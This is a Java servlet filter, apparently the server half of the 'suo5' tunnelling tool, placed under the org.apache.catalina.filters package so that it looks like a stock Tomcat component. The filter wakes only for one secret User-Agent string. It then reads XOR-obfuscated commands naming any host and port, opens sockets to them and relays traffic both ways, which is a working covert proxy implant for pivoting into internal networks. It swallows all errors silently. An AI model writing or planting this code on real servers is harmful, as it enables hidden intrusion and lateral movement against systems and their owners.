package org.apache.catalina.filters;


import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;

public class Suo5Filter implements Filter, Runnable {

    InputStream gInStream;
    OutputStream gOutStream;

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void destroy() {
    }

    private void setStream(InputStream in, OutputStream out) {
        gInStream = in;
        gOutStream = out;
    }

    public void doFilter(ServletRequest sReq, ServletResponse sResp, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) sReq;
        HttpServletResponse response = (HttpServletResponse) sResp;
        String agent = request.getHeader("User-Agent");
        String contentType = request.getHeader("Content-Type");

        if (agent == null || !agent.equals("Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.1.2.3")) {
            if (chain != null) {
                chain.doFilter(sReq, sResp);
            }
            return;
        }
        if (contentType == null) {
            return;
        }

        try {
            if (contentType.equals("application/plain")) {
                tryFullDuplex(request, response);
                return;
            }

            if (contentType.equals("application/octet-stream"))  {
                processDataBio(request, response);
            } else {
                processDataUnary(request, response);
            }
        } catch (Throwable e) {
//                System.out.printf("process data error %s", e);
//                e.printStackTrace();
        }
    }

    public void readInputStreamWithTimeout(InputStream is, byte[] b, int timeoutMillis) throws IOException, InterruptedException {
        int bufferOffset = 0;
        long maxTimeMillis = new Date().getTime() + timeoutMillis;
        while (new Date().getTime() < maxTimeMillis && bufferOffset < b.length) {
            int readLength = b.length - bufferOffset;
            if (is.available() < readLength) {
                readLength = is.available();
            }
            // can alternatively use bufferedReader, guarded by isReady():
            int readResult = is.read(b, bufferOffset, readLength);
            if (readResult == -1) break;
            bufferOffset += readResult;
            Thread.sleep(200);
        }
    }

    public void tryFullDuplex(HttpServletRequest request, HttpServletResponse response) throws IOException, InterruptedException {
        InputStream in = request.getInputStream();
        byte[] data = new byte[32];
        readInputStreamWithTimeout(in, data, 2000);
        OutputStream out = response.getOutputStream();
        out.write(data);
    }


    private HashMap newCreate(byte s) {
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        m.put("ac", new byte[]{0x04});
        m.put("s", new byte[]{s});
        return m;
    }

    private HashMap newData(byte[] data) {
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        m.put("ac", new byte[]{0x01});
        m.put("dt", data);
        return m;
    }

    private HashMap newDel() {
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        m.put("ac", new byte[]{0x02});
        return m;
    }

    private HashMap newStatus(byte b) {
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        m.put("s", new byte[]{b});
        return m;
    }

    byte[] u32toBytes(int i) {
        byte[] result = new byte[4];
        result[0] = (byte) (i >> 24);
        result[1] = (byte) (i >> 16);
        result[2] = (byte) (i >> 8);
        result[3] = (byte) (i /*>> 0*/);
        return result;
    }

    int bytesToU32(byte[] bytes) {
        return ((bytes[0] & 0xFF) << 24) |
                ((bytes[1] & 0xFF) << 16) |
                ((bytes[2] & 0xFF) << 8) |
                ((bytes[3] & 0xFF) << 0);
    }


    private byte[] marshal(HashMap<String, byte[]> m) throws IOException {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        for (String key : m.keySet()) {
            byte[] value = m.get(key);
            buf.write((byte) key.length());
            buf.write(key.getBytes());
            buf.write(u32toBytes(value.length));
            buf.write(value);
        }

        byte[] data = buf.toByteArray();
        ByteBuffer dbuf = ByteBuffer.allocate(5 + data.length);
        dbuf.putInt(data.length);
        // xor key
        byte key = data[data.length / 2];
        dbuf.put(key);
        for (int i = 0; i < data.length; i++) {
            data[i] = (byte) (data[i] ^ key);
        }
        dbuf.put(data);
        return dbuf.array();
    }

    private HashMap<String, byte[]> unmarshal(InputStream in) throws Exception {
        DataInputStream reader = new DataInputStream(in);
        byte[] header = new byte[4 + 1]; // size and datatype
        reader.readFully(header);
        // read full
        ByteBuffer bb = ByteBuffer.wrap(header);
        int len = bb.getInt();
        int x = bb.get();
        if (len > 1024 * 1024 * 32) {
            throw new IOException("invalid len");
        }
        byte[] bs = new byte[len];
        reader.readFully(bs);
        for (int i = 0; i < bs.length; i++) {
            bs[i] = (byte) (bs[i] ^ x);
        }
        HashMap<String, byte[]> m = new HashMap<String, byte[]>();
        byte[] buf;
        for (int i = 0; i < bs.length - 1; ) {
            short kLen = bs[i];
            i += 1;
            if (i + kLen >= bs.length) {
                throw new Exception("key len error");
            }
            if (kLen < 0) {
                throw new Exception("key len error");
            }
            buf = Arrays.copyOfRange(bs, i, i+kLen);
            String key = new String(buf);
            i += kLen;

            if (i + 4 >= bs.length) {
                throw new Exception("value len error");
            }
            buf = Arrays.copyOfRange(bs, i, i+4);
            int vLen = bytesToU32(buf);
            i += 4;
            if (vLen < 0) {
                throw new Exception("value error");
            }

            if (i + vLen > bs.length) {
                throw new Exception("value error");
            }
            byte[] value = Arrays.copyOfRange(bs, i, i+vLen);
            i += vLen;

            m.put(key, value);
        }
        return m;
    }

    private void processDataBio(HttpServletRequest request, HttpServletResponse resp) throws Exception {
        final InputStream reqInputStream = request.getInputStream();
        final BufferedInputStream reqReader = new BufferedInputStream(reqInputStream);
        HashMap<String, byte[]> dataMap;
        dataMap = unmarshal(reqReader);

        byte[] action = dataMap.get("ac");
        if (action.length != 1 || action[0] != 0x00) {
            resp.setStatus(403);
            return;
        }
        resp.setBufferSize(8 * 1024);
        final OutputStream respOutStream = resp.getOutputStream();

        // 0x00 create socket
        resp.setHeader("X-Accel-Buffering", "no");
        String host = new String(dataMap.get("h"));
        int port = Integer.parseInt(new String(dataMap.get("p")));
        Socket sc;
        try {
            sc = new Socket();
            sc.connect(new InetSocketAddress(host, port), 5000);
        } catch (Exception e) {
            respOutStream.write(marshal(newStatus((byte) 0x01)));
            respOutStream.flush();
            respOutStream.close();
            return;
        }

        respOutStream.write(marshal(newStatus((byte) 0x00)));
        respOutStream.flush();

        final OutputStream scOutStream = sc.getOutputStream();
        final InputStream scInStream = sc.getInputStream();

        Thread t = null;
        try {
            Suo5Filter p = new Suo5Filter();
            p.setStream(scInStream, respOutStream);
            t = new Thread(p);
            t.start();
            readReq(reqReader, scOutStream);
        } catch (Exception e) {
//                 System.out.printf("pipe error, %s\n", e);
        } finally {
            sc.close();
            respOutStream.close();
            if (t != null) {
                t.join();
            }
        }
    }

    private void readSocket(InputStream inputStream, OutputStream outputStream) throws IOException {
        byte[] readBuf = new byte[1024 * 8];

        while (true) {
            int n = inputStream.read(readBuf);
            if (n <= 0) {
                break;
            }
            byte[] dataTmp = Arrays.copyOfRange(readBuf, 0, 0+n);
            byte[] finalData = marshal(newData(dataTmp));
            outputStream.write(finalData);
            outputStream.flush();
        }
    }

    private void readReq(BufferedInputStream bufInputStream, OutputStream socketOutStream) throws Exception {
        while (true) {
            HashMap<String, byte[]> dataMap;
            dataMap = unmarshal(bufInputStream);

            byte[] action = dataMap.get("ac");
            if (action.length != 1) {
                return;
            }
            if (action[0] == 0x02) {
                socketOutStream.close();
                return;
            } else if (action[0] == 0x01) {
                byte[] data = dataMap.get("dt");
                if (data.length != 0) {
                    socketOutStream.write(data);
                    socketOutStream.flush();
                }
            } else {
                return;
            }
        }
    }

    private void processDataUnary(HttpServletRequest request, HttpServletResponse resp) throws
            Exception {
        InputStream is = request.getInputStream();
        ServletContext ctx = request.getSession().getServletContext();
        BufferedInputStream reader = new BufferedInputStream(is);
        HashMap<String, byte[]> dataMap;
        dataMap = unmarshal(reader);

        String clientId = new String(dataMap.get("id"));
        byte[] action = dataMap.get("ac");
        if (action.length != 1) {
            resp.setStatus(403);
            return;
        }
        /*
        ActionCreate byte = 0x00
        ActionData   byte = 0x01
        ActionDelete byte = 0x02
        ActionResp   byte = 0x03
         */
        resp.setBufferSize(8 * 1024);
        OutputStream respOutStream = resp.getOutputStream();
        if (action[0] == 0x02) {
            OutputStream scOutStream = (OutputStream) ctx.getAttribute(clientId);
            if (scOutStream != null) {
                scOutStream.close();
            }
            return;
        } else if (action[0] == 0x01) {
            OutputStream scOutStream = (OutputStream) ctx.getAttribute(clientId);
            if (scOutStream == null) {
                respOutStream.write(marshal(newDel()));
                respOutStream.flush();
                respOutStream.close();
                return;
            }
            byte[] data = dataMap.get("dt");
            if (data.length != 0) {
                scOutStream.write(data);
                scOutStream.flush();
            }
            respOutStream.close();
            return;
        }

        resp.setHeader("X-Accel-Buffering", "no");
        String host = new String(dataMap.get("h"));
        int port = Integer.parseInt(new String(dataMap.get("p")));
        Socket sc;
        try {
            sc = new Socket();
            sc.connect(new InetSocketAddress(host, port), 5000);
        } catch (Exception e) {
            respOutStream.write(marshal(newStatus((byte) 0x01)));
            respOutStream.flush();
            respOutStream.close();
            return;
        }

        OutputStream scOutStream = sc.getOutputStream();
        ctx.setAttribute(clientId, scOutStream);
        respOutStream.write(marshal(newStatus((byte) 0x00)));
        respOutStream.flush();

        InputStream scInStream = sc.getInputStream();

        try {
            readSocket(scInStream, respOutStream);
        } catch (Exception e) {
//                System.out.printf("pipe error, %s", e);
//                e.printStackTrace();
        } finally {
            sc.close();
            respOutStream.close();
            ctx.removeAttribute(clientId);
        }
    }

    public void run() {
        try {
            readSocket(gInStream, gOutStream);
        } catch (Exception e) {
//                System.out.printf("read socket error, %s", e);
//                e.printStackTrace();
        }
    }
}